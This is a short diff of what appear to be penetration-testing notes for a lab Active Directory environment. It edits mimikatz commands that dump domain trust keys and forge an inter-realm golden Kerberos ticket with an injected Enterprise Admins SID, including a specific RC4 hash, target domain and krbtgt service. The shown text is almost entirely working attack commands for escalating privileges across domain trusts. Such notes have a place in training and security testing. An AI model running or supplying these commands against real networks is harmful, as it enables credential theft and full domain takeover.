@@ -128,7 +128,7 @@ klist
 ```
 mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
 
-mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ticket:trustkey.kirbi /ptt"
+.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:0540fe51ddd618f42a66ef059ac36441 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"
 
 klist
 
